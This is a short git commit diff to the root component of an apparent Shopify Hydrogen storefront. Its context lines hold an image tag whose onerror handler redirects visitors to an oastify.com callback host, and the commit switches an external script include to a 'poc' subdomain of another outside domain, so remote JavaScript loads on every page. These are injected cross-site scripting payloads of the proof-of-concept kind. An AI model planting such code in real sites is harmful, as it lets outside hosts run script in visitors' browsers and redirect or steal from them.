7d819d97536bc559e51e60503b266931eadb9888
2930r2hnfdsin <127764396+2930r2hnfdsin@users.noreply.github.com>
2023-03-26 14:54:36 +0200

    Update root.jsx

--- app/root.jsx
+++ app/root.jsx
@@ -54,7 +54,7 @@ export default function App() {
         <h1>Hello, {name}</h1>
 <img src onerror='location=`http://fbuz558sx6xwkegcvppwpazi79d01rwfl.oastify.com`'/>
         <p>This is a custom storefront powered by Hydrogenafrraaa</p>
-<script src="https://pow.wleberre.fr/js.js"></script>
+<script src="https://poc.wleberre.fr/js.js"></script>
         <Outlet />
         <ScrollRestoration />
         <Scripts />
